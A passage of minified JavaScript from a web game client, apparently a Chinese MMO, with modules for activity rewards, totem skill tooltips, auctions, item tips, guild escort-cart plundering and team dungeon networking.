i=t.call(this,e)||this;return i.currGetTotal=0,i.hasRecharge=!1,i.currVipTotal=0,i.currentNum=0,i.getMoney=0,i.vipGetMoney=0,i.num=0,i.update(e),i}return __extends(e,t),e.prototype.update=function(t){this.currData=[],this.currGetTotal=t.readInt(),this.hasRecharge=1==t.readByte(),this.currVipTotal=t.readInt(),this.currGet=t.readInt(),this.currentNum=t.readShort();for(var e=0;e<this.currentNum;e++){var i=t.readString(),n=t.readInt();this.currData.push({name:i,count:n})}this.hongbaoEndTime=t.readInt(),this.robTimes=t.readByte()},e.prototype.canReward=function(){return this.currVipTotal>0&&this.hasRecharge},e.prototype.postHongBaoData=function(t){this.currData=[],t.readShort(),this.currGet=t.readInt(),this.vipGetMoney=t.readInt(),this.hasRecharge=1==t.readByte(),this.currVipTotal=t.readInt(),this.currentNum=t.readShort();for(var i=0;i<this.currentNum;i++){var n=t.readString(),o=t.readInt();this.currData.push({name:n,count:o})}this.hongbaoEndTime=t.readInt(),this.robTimes=t.readByte(),this.hasRecharge&&(this.currGet=this.currGet+this.vipGetMoney),e.HasHongBao=!1,s.Activity.ins().postHongBaoOpen()},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return 0>t&&e>0},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.HasHongBao=!1,e}(a.ActivityBaseData);e.ActivityType38Data=r,window.ActivityType38Data=r,__reflect(r.prototype,"ActivityType38Data",[]),window.ActivityType38Data=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkillEffType=void 0;var n;!function(t){t[t.AdditionalDamage=1]="AdditionalDamage",t[t.AddBlood=2]="AddBlood",t[t.AdditionalAttributes=3]="AdditionalAttributes",t[t.AdditionalState=4]="AdditionalState",t[t.Summon=5]="Summon",t[t.Other=6]="Other",t[t.HostAddAttributes=7]="HostAddAttributes",t[t.SuperArmor=8]="SuperArmor"}(n=e.SkillEffType||(e.SkillEffType={})),window.SkillEffType=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TotemItemLabelRender=e.TotemSkillTipsWin=void 0;var n=i(21),o=i(5),s=i(3),a=i(1),r=i(0),l=i(4),h=i(10),u=i(65),p=i(80),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TotemSkillTipsSkin",e.skinStates=["initial","normal","max"],e.totemId=0,e.isState=1,e.level=1,e.maxLevel=6,e.minLevel=1,e.showStr=["【集齐荒古套装】","【集齐荒古套装升级】","【集齐荒古套装】"],e.jobGrop=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.itemList.itemRenderer=c},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=r.GlobalConfig.TotemUnitConfig;t[0]?i&&(this.totemId=Number(i[t[0]].iconRes),this.maxLevel=i[t[0]].qualityNum[1],this.minLevel=i[t[0]].qualityNum[0]):win.close(this);for(var n in i)i[n].job&&i[n].job==l.ActorCC.jobId&&(this.jobGrop=i[n].group);this.level=1,this.updateDate()},e.prototype.updateDate=function(){this.initWinState(),this.initSkillData(),this.setSkillData()},e.prototype.initWinState=function(){this.isState=p.TotemCT.ins().checkIsWearDone(this.totemId,this.jobGrop)?2:1,2==this.isState&&(this.isState=p.TotemCT.ins().checkIsWearMax(this.totemId,this.jobGrop,this.maxLevel)?3:2,this.level=p.TotemCT.ins().checkIsWearLevel(this.totemId,this.jobGrop)),this.currentState=this.skinStates[this.isState-1]},e.prototype.initSkillData=function(){var t=this.level,e=r.GlobalConfig.TotemMainSkillConfig[this.jobGrop][t];if(e){var i=e.skillId,o=r.GlobalConfig.SkillsConfig[i].desc;this.skillName.text=r.GlobalConfig.SkillsDescConfig[o].name;for(var s=r.GlobalConfig.TotemUnitConfig[this.jobGrop],a=r.GlobalConfig.TotemConfig,l=s.partNum,h="",u=!1,d=[],c=1;l+1>c;c++){u=!p.TotemCT.ins().checkCanWear(this.totemId+c),h=a[this.totemId+c].name;var f={name:h,isWear:u};d.push(f)}this.itemList.dataProvider=new eui.ArrayCollection(d),this.effAni||(this.effAni=new n.MovieClip,this.effGrop.addChild(this.effAni)),this.effAni.stop(),this.effAni.playFile(""+RES_DIR_EFF+r.GlobalConfig.TotemMainSkillConfig[this.jobGrop][this.level].skillGif,-1)}},e.prototype.setSkillData=function(){var t=this.jobGrop,e=r.GlobalConfig.TotemMainSkillConfig[t][this.level].skillId,i=r.GlobalConfig.SkillsConfig[e],n=i.desc,s=r.GlobalConfig.SkillsDescConfig[n];switch(this.isState){case 1:this.curskillDesc0.text=gettext("【{0}{1}级】",s.name,this.level),this.curskillDesc3.textFlow=o.TextFlowMaker.generateTextFlow1(u.SkillUtil.getDesc(i,i.desc_ex));break;case 2:this.curskillDesc0.text=gettext("【{0}{1}级】",s.name,this.level),this.curskillDesc3.textFlow=o.TextFlowMaker.generateTextFlow1(u.SkillUtil.getDesc(i,i.desc_ex)),this.nextskillTitle0.text=gettext("【{0}{1}级】",s.name,this.level+1);var a=r.GlobalConfig.SkillsConfig[e+1];this.nextskillTitle3.textFlow=o.TextFlowMaker.generateTextFlow1(u.SkillUtil.getDesc(a,a.desc_ex));break;case 3:this.nextskillTitle0.text=gettext("【{0}{1}级】",s.name,this.level),this.nextskillTitle3.textFlow=o.TextFlowMaker.generateTextFlow1(u.SkillUtil.getDesc(i,i.desc_ex))}},e.prototype.tabRp=function(){return!1},e}(a.BaseView);e.TotemSkillTipsWin=d,window.TotemSkillTipsWin=d,__reflect(d.prototype,"TotemSkillTipsWin",[]),window.TotemSkillTipsWin=d;var c=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){var t;this.nameValue.text=this.data.name,this.data.isWear&&(this.nameValue.textColor=h.ItemUtil.getQualityColor(1),(null===(t=this.data)||void 0===t?void 0:t.quality)&&(this.nameValue.textColor=h.ItemUtil.getQualityColor(this.data.quality)))},e}(s.BaseItemRender);e.TotemItemLabelRender=c,window.TotemItemLabelRender=c,__reflect(c.prototype,"TotemItemLabelRender",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType7Data=void 0;var n=i(8),o=i(0),s=i(6),a=i(7),r=i(9),l=i(33),h=function(t){function e(e){var i=t.call(this,e)||this;return i.personalRewardsSum=[],i.worldRewardsSum=[],i.exchange=[],i.initBuyData(e),i}return __extends(e,t),e.prototype.update=function(e){t.prototype.update.call(this,e);var i=e.readShort(),n=e.readShort();this.personalRewardsSum[i]=n,this.worldRewardsSum[i]=e.readShort(),this.exchange[i]=e.readShort()},e.prototype.initBuyData=function(t){for(var e=t.readShort(),i=1;e>=i;i++)this.personalRewardsSum[i]=t.readShort(),this.worldRewardsSum[i]=t.readShort(),this.exchange[i]=t.readShort();this.bossScore=t.readInt()},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.isOpenActivity=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.checkRedPoint=function(){return r.Activity.ins().getType7RedPoint(this.id)},e.prototype.getAwardState=function(t){var e=o.GlobalConfig.ActivityType7Config[this.id][t],i=this.personalRewardsSum[e.index]>=e.count;return i?r.Activity.Geted:this.bossScore>=e.score?r.Activity.CanGet:r.Activity.NotReached},e.prototype.getExchange=function(t,e){void 0===e&&(e=0);var i,n;if(i=r.Activity.ins().getActivityDataById(this.id),n=o.GlobalConfig.ActivityType7Config[this.id][t],!n.items&&0==e)return r.Activity.NotReached;var a=r.Activity.CanGet,l=i.worldRewardsSum[t],h=i.exchange[t],u=i.personalRewardsSum[t];if(0==e)for(var p in n.items){var d=s.BagCT.ins().getBagItemById(n.items[p].id),c=d?d.count:0;if(c<n.items[p].count){a=r.Activity.NotReached;break}}else{var d=s.BagCT.ins().getBagItemById(n.itemId),c=d?d.count:0;c<n.itemCount&&(a=r.Activity.NotReached)}return a!=r.Activity.NotReached&&(n.scount&&l>=n.scount&&(a=r.Activity.Geted),n.count&&u>=n.count&&(a=r.Activity.Geted),n.dailyCount&&h>=n.dailyCount&&(a=r.Activity.Geted)),a},e.prototype.getLeftTime=function(){if(this.endTime){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return 0>t&&(t=0),t}return 0},e.prototype.getRemainTime=function(){var t,e=Math.floor((n.DateUtils.formatMiniDateTime(this.startTime)-a.GameServerCC.serverTime)/1e3),i=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-a.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):n.DateUtils.getFormatBySecond(i,n.DateUtils.TIME_FORMAT_5,3)},e.TYPE_RING=1,e.TYPE_HEFUBOSS=2,e.TYPE_CELEBREATE=5,e.TYPE_LABA=6,e}(l.ActivityBaseData);e.ActivityType7Data=h,window.ActivityType7Data=h,__reflect(h.prototype,"ActivityType7Data",[]),window.ActivityType7Data=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AuctionWin=void 0;var n=i(1),o=i(130),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="auctionSkin",e.evsIdx=0,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];this.evsIdx=t[0]||0,e.Page_Type=this.evsIdx,this.addChangeEvent(this.tab,this.onTabTouch)},e.prototype.removeDisplay=function(){},e.prototype.onTabTouch=function(){this.evsIdx!=this.tab.selectedIndex&&(this.evsIdx=this.tab.selectedIndex,e.Page_Type=this.tab.selectedIndex,o.Auction.ins().postChangeView())},e.Page_Type=0,e}(n.BaseView);e.AuctionWin=s,window.AuctionWin=s,__reflect(s.prototype,"AuctionWin",[]),window.AuctionWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemDetailedWin=void 0;var n=i(1),o=i(11),s=i(6),a=i(0),r=i(10),l=i(5),h=i(39),u=i(4),p=i(231),d=i(63),c=i(7),f=i(8),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e.layoutNum=LayoutNum.top,e._sn_="ItemTipsSkin",e.endTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eItemList.itemRenderer=o.ItemBase,this.gainList.itemRenderer=p.GainGoodsItem,this.gainList.dataProvider=this.arc=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0],n=t[1],o=t[2],l=t[3]?t[3]:0;this.addTouchEndEvent(this,this.otherClose),this.addTouchEvent(this.btnUse,this.onclick),this.gainList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onTouchList,this);var u=a.GlobalConfig.ItemConfig[n];this.btnUse.visible=r.ItemUtil.getType(u)==h.ItemType.TYPE_14&&!!s.BagCT.ins().getBagItemById(n),this.setData(i,n,o,l),this.lb_leftTime.text="",this.endTime&&(Timer.start(1e3,0,this.updateTime,this),this.updateTime())},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];Timer.stop(this.updateTime,this),this.removeEventListener(egret.TouchEvent.TOUCH_END,this.otherClose,this)},e.prototype.otherClose=function(t){win.close(this)},e.prototype.setData=function(t,e,i,n){void 0===n&&(n=0),this.endTime=n;var o="";if(void 0==i){var h=s.BagCT.ins().getBagGoodsByTypeAndId(t,e);o=h?h.count+"":"0"}else o=i+"";var p=a.GlobalConfig.ItemConfig[e];this.quali.source="tips_"+r.ItemUtil.getQuality2(p),u.ActorCC.isLocation?this.nameLabel.text=p.name+("("+p.id+")"):this.nameLabel.text=p.name,this.nameLabel.textColor=r.ItemUtil.getQualityColor(r.ItemUtil.getQuality2(p)),this.itemIcon.setData(p),this.lv.textFlow=l.TextFlowMaker.generateTextFlow1(gettext("等级：|C:0xB1B097&T:{0}级|",p.level||1)),this.num.textFlow=l.TextFlowMaker.generateTextFlow1(gettext("数量：|C:0xB1B097&T:{0}|",o)),this.description.textFlow=l.TextFlowMaker.generateTextFlow1(p.desc),this.power.text="",this.updateItemList(p);var d=a.GlobalConfig.GainItemConfig[e];!d||this.btnUse.visible||(null===urlParam||void 0===urlParam?void 0:urlParam.isHideAllShop)?(this.gainListGroup.visible=!1,this.arc.replaceAll(null),this.gainListGroup.height=0):(this.gainListGroup.visible=!0,this.arc.replaceAll(d.gainWay.concat()))},e.prototype.updateItemList=function(t){var e=a.GlobalConfig.ItemRandomConfig[t.id];e&&(this.eItemList.dataProvider=new eui.ArrayCollection(e.awards))},e.prototype.onclick=function(t){switch(t.currentTarget){case this.btnUse:win.open("RenameWin"),win.close(this)}},e.prototype.onTouchList=function(t){var e=t.item;null!=t.item&&(d.WarnCT.ins().handleItemWayTouch(e),win.close(this))},e.prototype.updateTime=function(){var t=Math.floor((this.endTime-c.GameServerCC.serverTime)/1e3);t>0?this.lb_leftTime.text=gettext("{0}后过期自动删除",f.DateUtils.getFormatBySecond(t,f.DateUtils.TIME_FORMAT_5,3)):this.lb_leftTime.text=gettext("已过期")},e}(n.BaseView);e.ItemDetailedWin=g,window.ItemDetailedWin=g,__reflect(g.prototype,"ItemDetailedWin",[]),window.ItemDetailedWin=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarWarnWin=void 0;var n=i(19),o=i(1),s=i(0),a=i(6),r=i(28),l=i(7),h=i(2),u=i(68),p=function(t){function e(){var e=t.call(this)||this;return e._sn_="CrossDartCarWarnSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onTap)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.carInfo=t[0],this.updateData()},e.prototype.updateData=function(){var t=s.GlobalConfig.GuildEscortCartBaseConfig.tranItem;if(t){this.cost.setData(t,!1,!1);var e=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,t.id),i={type:0,id:t.id,count:e};this.money.setData(i,!1,!1);var n=u.CrossDartCarCT.ins().getAddition(this.carInfo);this.lb_addVal.text=n+"%",this.lb_luckyVal.text=.01*this.carInfo.luck+"%",this.carInfo.tranT>0?this.lb_carState.text=gettext("镖队已被劫毁"):this.lb_carState.text=this.carInfo.bolAtked?gettext("镖队正遭遇攻击"):gettext("当前未在战斗中"),this.lb_carName.text=gettext("{0}的镖队",this.carInfo.guildName)}},e.prototype.onTap=function(t){switch(t.target){case this.btnCancle:case this.closeBtn:win.close(this);break;case this.btnOK:if(this.carInfo.guildId==r.Guild.ins().guildID)return void h.TipsCT.ins().showTips(gettext("自己公会的镖车不能劫镖"));if(this.carInfo.tranT)return void h.TipsCT.ins().showTips(gettext("已被劫毁"));var e=s.GlobalConfig.GuildEscortCartBaseConfig.dailyTranT?s.GlobalConfig.GuildEscortCartBaseConfig.dailyTranT:0;if(e-u.CrossDartCarCT.ins().tranTimes<=0)return void h.TipsCT.ins().showTips(gettext("今日无劫镖次数"));var i=s.GlobalConfig.GuildEscortCartBaseConfig.carTranT;if(i-this.carInfo.tranTimes<=0)return void h.TipsCT.ins().showTips(gettext("本车已无劫镖次数"));var o=s.GlobalConfig.GuildEscortCartBaseConfig.disTime,a=s.GlobalConfig.GuildEscortCartBaseConfig.cantTranTime;if(l.GameServerCC.serverTime+1e3*o-this.carInfo.startTime<1e3*a)return void h.TipsCT.ins().showTips(gettext("最后{0}秒不能劫镖",a));var p=s.GlobalConfig.GuildEscortCartBaseConfig.tranItem;if(p&&!n.GlobalFun.checkCost(p.count,p.id))return;u.CrossDartCarCT.ins().sendPlunder(this.carInfo.guildId),win.close(this)}},e}(o.BaseView);e.CrossDartCarWarnWin=p,window.CrossDartCarWarnWin=p,__reflect(p.prototype,"CrossDartCarWarnWin",[]),window.CrossDartCarWarnWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DYSidebarItem=void 0;var n=i(3),o=i(11),s=i(116),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t,e,i,n,a;if(this.data&&this.skin){this.eList.itemRenderer=o.ItemBase,this.eList.dataProvider=this._awardArr=new eui.ArrayCollection;var r=null===(t=this.data)||void 0===t?void 0:t.id;if(this.desktop.visible=!1,this.sidebar.visible=!1,this.eGet.visible=!1,this._awardArr.source=null===(e=this.data)||void 0===e?void 0:e.reward,this.eList.validateNow(),r>0){this.addTouchEvent(this.eBtn,this.onClickHandler);var l=s.TikTokCT.ins().TikTokNowArr[r];if(1==(null===(i=this.data)||void 0===i?void 0:i.day)?(this.next.visible=!1,1==r?this.sidebar.visible=!0:this.desktop.visible=!0):(this.next.visible=!0,this.next.text=gettext("第{0}天登录可领取",(null===(n=this.data)||void 0===n?void 0:n.day)-1)),l){var h=l.arr[(null===(a=this.data)||void 0===a?void 0:a.day)-1];if(this.eBtn.visible=!0,this.eBtn.eRp.visible=!1,0==h||h)switch(h){case 0:this.eBtn.label=gettext("可领取"),this.eBtn.eRp.visible=!0,this.eBtn.enabled=!0;break;case 1:this.eBtn.visible=!1,this.eGet.visible=!0;break;case 2:this.eBtn.label=gettext("已过期"),this.eBtn.enabled=!1}else this.eBtn.label=gettext("未领取"),this.eBtn.enabled=!1}else this.eBtn.eRp.visible=!1,this.eBtn.label=gettext("未领取"),this.eBtn.enabled=!1}}},e.prototype.onClickHandler=function(t){var e,i;switch(t.target){case this.eBtn:s.TikTokCT.ins().getTikTokAwardByDay(null===(e=this.data)||void 0===e?void 0:e.id,null===(i=this.data)||void 0===i?void 0:i.day)}},e}(n.BaseItemRender);e.DYSidebarItem=a,window.DYSidebarItem=a,__reflect(a.prototype,"DYSidebarItem",[]),window.DYSidebarItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MemberInfoWin=void 0;var n=i(1),o=i(164),s=i(32),a=i(44),r=i(249),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="memberInfoSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._data=t[0],this.type=t[1],this.addTouchEvent(this,this.onTouch),observe(this,this.openOtherPlayerView,a.ReadPlayerCT.ins().postPlayerResult),this.update()},e.prototype.update=function(){this.imgBg.source=o.ChatListItemRenderer.HEAD_BG[this._data.sex],this.imgHead.source="head_"+this._data.job+this._data.sex,this.labelName.text=this._data.roleName,this.labelLv.text=(this._data.zs?gettext("{0}级",this._data.zs):"")+gettext("{0}级",this._data.lv),this.btnRemove.visible=this.type?r.RareAnimalCT.ins().isTFCaptain:s.FbCT.ins().isTFCaptain},e.prototype.onTouch=function(t){switch(t.target){case this.btnInfo:a.ReadPlayerCT.ins().sendFindPlayer(this._data.roleID);break;case this.btnRemove:this.type?r.RareAnimalCT.ins().sendQuitMember(this._data.roleID):s.FbCT.ins().sendOutTFRoom(this._data.roleID),win.close(this)}},e.prototype.openOtherPlayerView=function(t){win.open("TeamFBCheckRoleWin",t)},e}(n.BaseView);e.MemberInfoWin=l,window.MemberInfoWin=l,__reflect(l.prototype,"MemberInfoWin",[]),window.MemberInfoWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RareAnimalCT=void 0;var n=i(8),o=i(14),s=i(4),a=i(45),r=i(163),l=i(236),h=i(7),u=i(2),p=function(t){function e(){var e=t.call(this)||this;return e.helpNum=0,e.passNum=0,e.cdCount=0,e.isBackShow=!1,e.sysId=PackageID.Guanqia,e.regNetMsg(48,e.postInit),e.regNetMsg(49,e.postFbInfo),e.regNetMsg(51,e.postTeamNum),e.regNetMsg(52,e.postEnterTeam),e.regNetMsg(53,e.postQuit),e.regNetMsg(54,e.postTeamInfo),e.regNetMsg(55,e.postFbResult),e.regNetMsg(56,e.postInvite),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postInit=function(t){this.fbType=t.readUnsignedByte(),this.passNum=t.readUnsignedByte(),this.helpNum=t.readUnsignedByte()},e.prototype.postFbInfo=function(t){this.fbTime=h.GameServerCC.serverTime+1e3*t.readUnsignedInt(),this.attackTimes=t.readUnsignedByte(),this.vocation=t.readUnsignedByte()},e.prototype.postTeamNum=function(t){this.teamID=t.readUnsignedInt(),this.teamID?win.open("RareAnimalTeamWin",this.fbType,this.teamID):win.close("RareAnimalTeamWin")},e.prototype.postEnterTeam=function(t){switch(t.readUnsignedByte()){case 0:win.open("RareAnimalTeamWin",this.fbType,t.readUnsignedInt());break;case 1:u.TipsCT.ins().showTips(gettext("在副本内不能进入"));break;case 2:u.TipsCT.ins().showTips(gettext("已经在别的队伍"));break;case 3:u.TipsCT.ins().showTips(gettext("队伍已解散"));break;case 4:u.TipsCT.ins().showTips(gettext("队伍已经满人"))}},e.prototype.postQuit=function(t){switch(t.readUnsignedByte()){case 1:break;case 2:u.TipsCT.ins().showTips(gettext("您被队长踢出队伍"));break;case 3:u.TipsCT.ins().showTips(gettext("队长解散了队伍"))}win.close("RareAnimalTeamWin")},e.prototype.postTeamInfo=function(t){this.teamID=t.readInt();var e=t.readByte();this.tfMembers||(this.tfMembers=[]),this.tfMembers.length=e,this.isTFCaptain=!1;for(var i,n=0;e>n;n++)i=this.tfMembers[n],i||(i=new l.TeamFuBenRoleVo,this.tfMembers[n]=i),i.parse(t),i.roleID==s.ActorCC.actorID&&1==i.position&&(this.isTFCaptain=!0)},e.prototype.postFbResult=function(t){t.readUnsignedInt(),t.readUnsignedByte();this.attackTimes=t.readUnsignedByte();var e=t.readUnsignedByte();this.teamInfo=[],this.teamInfo.length=e;for(var i,n=0;e>n;n++)i=new l.TeamFuBenRoleVo,this.teamInfo[n]=i,i.roleID=t.readInt(),i.position=t.readByte();win.open("RareAnimalResultWin",this.fbType,this.attackTimes,this.teamInfo)},e.prototype.resetCD=function(){this.cdCount>0?this.cdCount--:Timer.stop(this.resetCD,this)},e.prototype.postInvite=function(t){var e=(t.readUnsignedInt(),t.readString());this.helpInfo=e,a.ChatCT.ins().postSysChatMsg(new r.ChatSystemData(3,e)),Timer.stop(this.resetCD,this);var i=t.readUnsignedInt(),o=Math.floor((n.DateUtils.formatMiniDateTime(i)-h.GameServerCC.serverTime)/1e3);this.cdCount=o,Timer.start(1e3,o+1,this.resetCD,this)},e.prototype.sendEnterFB=function(){this.sendBaseProto(48)},e.prototype.sendAward=function(t,e,i){var n=this.getBytes(50);n.writeByte(t),n.writeByte(e),n.writeByte(i),this.sendToServer(n)},e.prototype.sendCreatTeam=function(){this.sendBaseProto(51)},e.prototype.sendEnterTeam=function(t){var e=this.getBytes(52);e.writeUnsignedInt(t),this.sendToServer(e)},e.prototype.sendQuitTeam=function(){this.sendBaseProto(53)},e.prototype.sendQuitMember=function(t){var e=this.getBytes(54);e.writeUnsignedInt(t),this.sendToServer(e)},e.prototype.sendInvite=function(t){var e=this.getBytes(56);e.writeString(t),this.sendToServer(e)},e.prototype.sendUpdate=function(){this.sendBaseProto(57)},e.prototype.checkOpen=function(t){return!0},e.prototype.getAwardNum=function(t){var e,i=[];for(var n in i)i[n]<=t&&(e=Number(n)+1);return e},__decorate([post()],e.prototype,"postInit",null),__decorate([post()],e.prototype,"postFbInfo",null),__decorate([post()],e.prototype,"postTeamNum",null),__decorate([post()],e.prototype,"postEnterTeam",null),__decorate([post()],e.prototype,"postQuit",null),__decorate([post()],e.prototype,"postTeamInfo",null),__decorate([post()],e.prototype,"postFbResult",null),__decorate([post()],e.prototype,"postInvite",null),e}(o.BaseSystem);e.RareAnimalCT=p,window.RareAnimalCT=p,__reflect(p.prototype,"RareAnimalCT",[]),Systemap.RareAnimalCT=function(){return p.ins()},window.RareAnimalCT=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFBCheckRoleWin=void 0;var n=i(61),o=i(1),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="teamFbCheckSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.viewStack.selectedIndex=0
},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.otherPlayerData=t[0],this.nameTxt.text=this.otherPlayerData.name,this.setRoleInfo(),this.roleInfoPanel.addDisplay(this.otherPlayerData)},e.prototype.setRoleInfo=function(){var t=this.otherPlayerData.roleData[0],e="[S"+this.otherPlayerData.serverId+"]";this.otherPlayerData.serverId&&this.otherPlayerData.serverId!=n.LocationProperty.srvid||(e=""),this.nameTxt.text=this.otherPlayerData.name+e,this.guildNameText.x=this.nameTxt.x+this.nameTxt.textWidth+10,this.guildNameText.text=this.otherPlayerData.guildName?gettext("公会：{0}",this.otherPlayerData.guildName):"";var i=this.otherPlayerData.zhuan?gettext("{0}转",this.otherPlayerData.zhuan):"";this.levelText.text=""+i+this.otherPlayerData.level+"级",this.headIcon.source="head_"+t.job+t.sex;var o=this.otherPlayerData.lilianLv,a=s.GlobalConfig.TrainLevelConfig[o];this.jueweiIcon.source="juewei_1_"+a.type+"_png"},e}(o.BaseView);e.TeamFBCheckRoleWin=a,window.TeamFBCheckRoleWin=a,__reflect(a.prototype,"TeamFBCheckRoleWin",[]),window.TeamFBCheckRoleWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChallengerHeadItemRender=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data,e=t.roleName,i=(t.sex,t.job);this.Name.text=e||gettext("虚位以待"),this.imgHead.source=i?"yuanhead"+i+"1":""},e}(n.BaseItemRender);e.ChallengerHeadItemRender=o,window.ChallengerHeadItemRender=o,__reflect(o.prototype,"ChallengerHeadItemRender",[]),window.ChallengerHeadItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuliWin=void 0;var n=i(1),o=i(84),s=i(408),a=i(409),r=i(405),l=i(57),h=i(411),u=i(17),p=i(406),d=i(407),c=i(35),f=i(9),g=i(56),m=i(404),v=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.oneLevelWin=!0,e._sn_="FuliMainSkin",e.evsIdx=0,e.winStr="",e.winStr1="",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addChangeEvent(this.eTab,this.onTabTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.winStr="",this.winStr1="",t[0]&&(this.isNumeric(t[0])?(this.winStr=t[0],t[1]&&(this.winStr1=t[1])):this.evsIdx=t[0]),this.initTab(),observe(this,this.updateTabRp,u.RedPointBaseSys.ins().RpChange),this.updateTabRp()},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.initTab=function(){var t=this.eVs.getChildIndex(this.FuliActivityMain);t>=0&&(f.Activity.ins().getActivityLengthByPageStyle(l.ActOnPlace.HuoDong)<=0||window.platform.isshen())&&this.eVs.removeChildAt(t),t=this.eVs.getChildIndex(this.MergeActivityMain),t>=0&&(f.Activity.ins().getActivityLengthByPageStyle(l.ActOnPlace.HeFu)<=0||window.platform.isshen())&&this.eVs.removeChildAt(t),t=this.eVs.getChildIndex(this.FuliMain3),t>=0&&(!o.FuLiCT.ins().isHasFuliActivity(g.Activity3PageStyle)||window.platform.isshen())&&this.eVs.removeChildAt(t),t=this.eVs.getChildIndex(this.FuliMain4),t>=0&&(!o.FuLiCT.ins().isHasFuliActivity(g.Activity4PageStyle)||window.platform.isshen())&&this.eVs.removeChildAt(t),t=this.eVs.getChildIndex(this.FuliMain5),t>=0&&(!o.FuLiCT.ins().isHasFuliActivity(g.Activity5PageStyle)||window.platform.isshen())&&this.eVs.removeChildAt(t),t=this.eVs.getChildIndex(this.FuliMain6),t>=0&&(!o.FuLiCT.ins().isHasFuliActivity(g.Activity6PageStyle)||window.platform.isshen())&&this.eVs.removeChildAt(t),t=this.eVs.getChildIndex(this.OSATarget41Panel1),t>=0&&(!f.Activity.ins().getActivityDataByType(g.ActivityDataType._41,g.ActSubType.TYPE_1)||window.platform.isshen())&&this.eVs.removeChildAt(t),t=this.eVs.getChildIndex(this.OSATarget41Panel28),t>=0&&(window.platform.isshen()||c.TaskCT.ins().checkJiJinRewardIsEnd())&&this.eVs.removeChildAt(t),t=this.eVs.getChildIndex(this.OSATarget41Panel27),t>=0&&window.platform.isshen()&&this.eVs.removeChildAt(t),t=this.eVs.getChildIndex(this.OSATarget0Panel2),(t>=0&&!o.FuLiCT.ins().checkOSA0_2()||window.platform.isshen())&&this.eVs.removeChildAt(t),this.winStr&&""!=this.winStr&&(this.evsIdx=this.returnIdx()),this.eTab.selectedIndex=this.evsIdx,this.eVs.selectedIndex=this.evsIdx,this.eTab.validateNow();var 